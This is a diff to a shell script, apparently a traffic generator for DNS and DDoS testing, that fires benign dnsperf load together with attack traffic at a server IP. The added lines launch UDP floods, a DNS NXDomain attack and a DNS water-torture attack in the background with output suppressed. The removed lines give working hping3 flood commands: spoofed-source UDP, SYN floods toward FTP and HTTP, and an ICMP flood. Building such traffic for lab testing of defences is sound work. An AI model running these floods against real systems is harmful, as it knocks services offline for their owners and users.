@@ -1,7 +1,7 @@
 #!/bin/sh
 # Christopher Gray
-# Version 0.1.14
-#  10-31-18
+# Version 0.2.1
+#  11-7-18
 
 if [ -z "$1" ]
 then
@@ -34,6 +34,19 @@ else
       wait
 fi
 
+echo "Running UDP Floods... \r\n "
+sudo ./gen_udp_floods.sh $server_ip  &>/dev/null &
+
+
+#------ Attack traffic ----------
+echo "Running NX Domain attack python script... \r\n "
+sudo python attack_dns_nxdomain.py $server_ip example.com 10000 &>/dev/null &
+
+echo "Running DNS Water Torture attack against server"
+sudo ./attack_dns_watertorture_wget.sh $server_ip  &>/dev/null &
+
+#-----------------------------------------------------------------------------------------------------------------
+
 # https://github.com/cobblau/dnsperf
 # Dnsperf supports the following command line options:
 
@@ -63,32 +76,8 @@ fi
 if [ -f test.net.txt ]
 then
       echo "Running custom created DNS Perf script, which generates alot of benign traffic. \r\n \r\n "
-      dnsperf -s $server_ip -d test.net.txt -b 100000  -t 2 -c 100 -q 100000 -l 300 2> /dev/null &
+      sudo dnsperf -s $server_ip -d test.net.txt -b 100000  -t 2 -c 100 -q 100000 -l 300 2> /dev/null &
 fi
-
-#-----------------------------------------------------------------------------------------------------------------
-# Hping3 Attacks
-echo "Running HPing3 DNS flood attack script, toward port 53, from random sources... \r\n "
-sudo hping3 --flood --rand-source --udp -p 53 $server_ip 2> /dev/null &
-
-echo "Running HPing3 attack script towards FTP... \r\n"
-sudo hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source $server_ip 2> /dev/null &
-
-echo "Running HPing3 flood attack to HTTP \r\n "
-sudo hping3 $server_ip -p 80 –SF --flood 2> /dev/null &
-
-echo "Running ping flood attack from random sources \r\n"
-sudo hping3 $server_ip --icmp --flood --rand-source 2> /dev/null &
-
-echo "Running syn flood attack from random sources, towards a webserver \r\n "
-sudo hping3 --syn --flood --rand-source --win 65535 --ttl 64 --data 16000 --morefrag --baseport 49877 --destport 80 $server_ip 2> /dev/null &
-
-#------ Attack traffic ----------
-echo "Running NX Domain attack python script... \r\n "
-sudo python attack_dns_nxdomain.py $server_ip example.com 10000 2> /dev/null &
-
-echo "Running DNS Water Torture attack against server"
-sudo ./attack_dns_watertorture_wget.sh $server_ip 2> /dev/null &
 
 #-----------------------------------------------------------------------------------------------------------------
 RATE=5000
